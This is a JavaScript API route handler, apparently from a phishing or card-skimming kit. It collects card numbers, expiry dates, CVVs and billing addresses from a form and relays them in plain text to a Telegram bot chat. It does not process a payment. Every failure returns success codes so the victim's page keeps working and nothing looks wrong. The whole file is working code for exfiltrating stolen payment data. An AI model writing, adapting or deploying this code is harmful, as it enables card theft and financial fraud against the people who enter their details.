// Send billing details to Telegram
import { sendTelegramMessage } from '../telegram';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const { cardNumber, expiration, cvv, address, city, state, zip, userId } = req.body;
      
      // Check environment variables
      const botToken = process.env.TELEGRAM_BOT_TOKEN;
      const chatId = process.env.TELEGRAM_CHAT_ID;
      
      console.log('[send-billing] Bot token exists:', !!botToken);
      console.log('[send-billing] Chat ID exists:', !!chatId);
      
      // Don't fail if Telegram is not configured - just log and continue
      if (!botToken || !chatId) {
        console.warn('[send-billing] Telegram not configured - skipping notification');
        return res.status(200).json({ 
          success: false,
          warning: 'Telegram not configured',
          message: 'Billing details not sent to Telegram. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in environment variables.'
        });
      }
      
      // Format the billing details message
      const message = `💳 <b>BILLING DETAILS SUBMITTED</b>\n\n` +
        `User ID: <code>${userId || 'N/A'}</code>\n` +
        `Time: ${new Date().toLocaleString()}\n\n` +
        `<b>Card Information:</b>\n` +
        `Card Number: <code>${cardNumber}</code>\n` +
        `Expiration: <code>${expiration}</code>\n` +
        `CVV: <code>${cvv}</code>\n\n` +
        `<b>Billing Address:</b>\n` +
        `Address: ${address}\n` +
        `City: ${city}\n` +
        `State: ${state}\n` +
        `ZIP: ${zip}`;
      
      // Try to send notification, but don't fail if it doesn't work
      try {
        const result = await sendTelegramMessage(message);
        
        if (result) {
          console.log('[send-billing] Telegram notification sent successfully');
          return res.status(200).json({ success: true, messageId: result.message_id });
        } else {
          console.warn('[send-billing] Failed to send Telegram notification, but continuing');
          return res.status(200).json({ 
            success: false,
            warning: 'Telegram notification failed',
            message: 'Billing details not sent to Telegram. Check bot token and chat ID.'
          });
        }
      } catch (telegramError) {
        console.error('[send-billing] Telegram error (non-blocking):', telegramError);
        // Still return success so page can continue
        return res.status(200).json({ 
          success: false,
          warning: 'Telegram notification error',
          error: telegramError.message,
          message: 'Billing details not sent to Telegram.'
        });
      }
    } catch (error) {
      console.error('[send-billing] Unexpected error:', error);
      // Return 200 so page can still continue even if notification fails
      return res.status(200).json({ 
        success: false,
        error: 'Notification error (non-blocking)',
        message: error.message,
        note: 'Page will continue to work normally'
      });
    }
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}
